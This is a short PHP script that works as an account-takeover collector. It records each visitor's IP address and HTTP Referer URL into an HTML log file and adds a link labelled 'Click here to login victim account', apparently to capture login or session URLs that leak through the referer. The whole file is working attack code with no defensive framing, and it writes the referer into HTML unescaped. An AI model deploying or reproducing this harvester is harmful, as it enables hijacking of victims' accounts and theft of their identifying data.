<?php

$ref = $_SERVER['HTTP_REFERER'];


$display_ref = substr($ref,0,100)."...";

$ref = explode("urlRef",$ref)[0];
$data = "{$_SERVER['REMOTE_ADDR']} == {$display_ref}\n\n"."<a target=_blank href='{$ref}'>Click here to login victim account</a>\n\n".str_repeat("-",20)."\n\n";

file_put_contents('./hihi.html',$data,FILE_APPEND);

?>
